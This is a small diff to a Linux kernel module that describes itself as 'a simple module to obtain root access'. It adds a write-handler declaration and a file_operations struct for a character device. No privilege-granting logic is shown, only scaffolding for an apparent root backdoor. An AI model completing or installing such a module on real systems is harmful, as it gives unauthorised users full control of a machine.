@@ -7,7 +7,12 @@ MODULE_AUTHOR("Zharaskhan Aman");
 MODULE_DESCRIPTION("A simple module to obtain root access");
 MODULE_VERSION("0.1");  
 
+static ssize_t custom_write(struct file *, const char __user *, size_t, loff_t *);
 static dev_t first;
+struct file_operations fops = {
+	.owner = THIS_MODULE,
+	.write = custom_write,
+};
 
 int init_module(void)
 {
